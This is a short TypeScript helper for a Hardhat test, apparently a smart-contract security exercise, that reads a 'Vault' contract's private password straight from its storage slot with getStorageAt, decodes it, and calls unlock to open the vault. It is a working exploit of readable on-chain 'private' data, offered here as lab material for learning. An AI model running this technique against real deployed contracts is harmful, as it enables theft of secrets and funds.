import { ethers, waffle } from "hardhat";

function hexToString(hex: string) {
  let str = "";

  for (let i = 0; i < hex.length; i += 2) {
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return str;
}

hexToString("32343630");

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const storage = await waffle.provider.getStorageAt(victim.address, 1);
  // eslint-disable-next-line no-control-regex
  const password = hexToString(storage).replace(/\x00/g, "");

  await victim.unlock(ethers.utils.formatBytes32String(password));
};

export default helper;